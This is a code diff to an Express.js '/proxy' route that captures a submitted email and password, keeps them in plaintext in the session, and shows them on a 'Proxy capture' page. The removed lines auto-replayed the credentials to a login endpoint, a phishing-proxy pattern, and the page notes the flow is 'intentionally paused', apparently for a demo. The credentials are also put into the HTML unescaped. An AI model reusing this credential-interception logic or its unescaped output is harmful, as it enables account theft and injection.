@@ -184,22 +184,64 @@ app.post('/proxy', (req, res) => {
     return res.status(400).send('<h2>Missing credentials</h2>');
   }
 
+  req.session.pendingUser = {
+    email,
+    password,
+    capturedAt: new Date().toISOString()
+  };
+
   return res.send(`<!DOCTYPE html>
     <html lang="en">
       <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Proxy redirect</title>
+        <title>Proxy capture</title>
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            margin: 24px;
+            background: #f3f4f6;
+          }
+          .card {
+            max-width: 520px;
+            margin: 40px auto;
+            background: white;
+            border: 1px solid #d1d5db;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+          }
+          .label {
+            display: block;
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #6b7280;
+            margin-bottom: 8px;
+          }
+          .value {
+            display: block;
+            padding: 10px 12px;
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            word-break: break-all;
+          }
+        </style>
       </head>
       <body>
-        <form id="proxy-form" method="POST" action="/login">
-          <input type="hidden" name="email" value="${email}" />
-          <input type="hidden" name="password" value="${password}" />
-        </form>
-        <script>
-          console.log('[PROXY] Replaying captured credentials to legitimate login');
-          document.getElementById('proxy-form').submit();
-        </script>
+        <div class="card">
+          <h2>Proxy capture</h2>
+          <div>
+            <span class="label">Email</span>
+            <span class="value">${email}</span>
+          </div>
+          <div>
+            <span class="label">Password</span>
+            <span class="value">${password}</span>
+          </div>
+          <p>The flow is intentionally paused here. The credentials were captured by the proxy and are waiting for validation.</p>
+        </div>
       </body>
     </html>`);
 });
